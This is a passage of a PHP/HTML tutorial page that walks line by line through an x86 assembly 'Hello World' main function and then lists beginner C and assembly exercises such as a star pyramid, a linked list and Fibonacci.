  <h2><kbd><span style='color:#e34adc; '>main:</span></kbd></h2>
    <ul>
      <li>Defines another label, called main</li>
      <li>This label, instead of pointing to data like msg, points to code (our main function)</li>
    </ul>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebp</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>This pushes the last function's block pointer onto the stack</li>
        <li>This is part of the standard function prologue</li>
        <li>Need to save ebp because we will overwrite ebp, and the caller expects ebp to be preserved</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/push_ebp.svg'); ?>" />
    <div class="clearfix"></div>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span></kbd></h2>
    <div class="col-md-5">
      <ul>
        <li>This sets ebp to point to the top of the stack</li>
        <li>Provides us with a fixed location to reference local memory from (esp changes)</li>
        <li>Notice how ebp now points to the saved ebp</li>
        <li>In this way, ebp forms a sort of linked-list</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/mov_ebp_esp.svg'); ?>" />
    <div class="clearfix"></div>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>push</span> msg</kbd></h2>
    <div class="col-md-5">
      <ul>
        <li>This pushes the value of the msg label onto the stack</li>
        <li>Labels are pointers</li>
        <li>So, the variable at the top of the stack points to our message</li>
        <li>We are pushing this onto the stack to use as an argument</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/push_msg.svg'); ?>" />
    <div class="clearfix"></div>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>call</span> <span style='color:#e34adc; '>printf</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>This calls printf() in the c library (libc)</li>
        <li>Recall: arguments are passed on the stack</li>
        <li>So, this is equivalent to <code class="language-c">printf(msg);</code></li>
        <li>printf() will return to the next instruction</li>
        <li>Recall: return value will be in eax</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/push_msg.svg'); ?>" />
    <div class="clearfix"></div>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>add</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>4</span></kbd></h2>   
    <div class="col-md-5">
      <ul>
        <li>printf() has returned</li>
        <li>Its return code is in eax (but we don't care)</li>
        <li>Now, we need to clean up the stack</li>
        <li>Recall: in x86 it is the caller's responsibility to remove arguments from the stack</li>
        <li>Recall: adding 4 to esp effectively removes one item from the stack</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/mov_ebp_esp.svg'); ?>" />
    <div class="clearfix"></div>
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>0</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>Putting the return code for main() into eax</li>
        <li>Necessary because we don't know what printf() will put there</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/mov_ebp_esp.svg'); ?>" />
    <div class="clearfix"></div>    
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ebp</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>Part of the standard epilogue</li>
        <li>Clears any local variable space we may have allocated</li>
        <li>Since we have not allocated any stack space - doesn't do anything</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/mov_ebp_esp.svg'); ?>" />
    <div class="clearfix"></div>    
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ebp</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>Restores the saved base pointer (ebp)</li>
        <li>Removes saved base pointer from the stack</li>
        <li>Sets up the stack frame for a return</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/pop_ebp.svg'); ?>" />
    <div class="clearfix"></div> 
  <h2><kbd><span style='color:#e66170; font-weight:bold; '>ret</span></kbd></h2>    
    <div class="col-md-5">
      <ul>
        <li>Return to the caller</li>
        <li>Return code in eax: 0</li>
        <li>main(): returns to startup code that calls exit()</li>
      </ul>
    </div>
    <img class="col-md-7" src="http://<?php echo base_url('/images/asm/ret.svg'); ?>" />
    <div class="clearfix"></div>
</div>

<h1 id="asm">ASM Exercises</h1>
  <p>Click on the exercise to display the challenge. When you are ready, view the solutions in the next section</p>
  <button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#asm1">
  Exercise One
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#asm2">
  Exercise Two
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#asm3">
  Exercise Three
</button>
<button type="button" class="btn btn-primary btn-lg" data-toggle="modal" data-target="#asm4">
  Exercise Four
</button>
  </div>
</div>
<?php endif; ?>
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
   <div class="modal-dialog">
      <div class="modal-content">
         <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
            <h4 class="modal-title" id="myModalLabel">C Exercise 1</h4>
         </div>
         <div class="modal-body">
            Write a program that will output a pyramid of N stars, given N at runtime.
            <br />
            Example:
            <pre><code>$ ./c0
How many stars? 5
    *
   * *
  * * *
 * * * *
* * * * *
$</code></pre>
         </div>
         <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
         </div>
      </div>
   </div>
</div>

<div class="modal fade" id="myModal2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">C Exercise 2</h4>
      </div>
      <div class="modal-body">
        Write a program that will tell you the value with the highest frequency of a data set of N integers.
        <br />
        Example:
    <pre><code>$ ./c1
How many numbers? 5
Numbers: 1 2 4 4 10
Highest frequency: 4 with f = 2
$</code></pre>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="myModal3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">C Exercise 3</h4>
      </div>
      <div class="modal-body">
Implement a linked list of integers in C. You will have to do this at some point in your life anyways, might as well have an implementation on hand. 
All you need to do is read in the integers, be able to iterate through them, and then properly deallocate the list. Doesn't need to be anything fancy.
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="asm1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">ASM Exercise 1</h4>
      </div>
      <div class="modal-body">
        Get Hello World working in assembly. (Line by Line walk-through above)
        <br />
        Example:
    <pre><code>$ ./asm0
Hello, World!
$</code></pre>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="asm2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">ASM Exercise 2</h4>
      </div>
      <div class="modal-body">
        Make a simple calculator that will add two numbers. 
        <br />
        Example:
    <pre><code>$ ./asm1
2 2
2 + 2 = 4
$</code></pre>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <!--<button type="button" class="btn btn-primary">Save changes</button>-->
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="asm3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">ASM Exercise 3</h4>
      </div>
      <div class="modal-body">
        Calculate the Nth term of the Fibonacci sequence, iteratively. 
        <br />
        Example:
    <pre><code>$ ./asm2
10
89
$</code></pre>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <!--<button type="button" class="btn btn-primary">Save changes</button>-->
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="asm4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">ASM Exercise 4</h4>
      </div>
      <div class="modal-body">
        Calculate the Nth term of the Fibonacci sequence, recursively.
        <br />
        Example:
    <pre><code>$ ./asm2
10
89
$</code></pre>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <!--<button type="button" class="btn btn-primary">Save changes</button>-->
      </div>
    </div>
  </div>
</div>
<?php
$this->load->view('templates/footer');
?>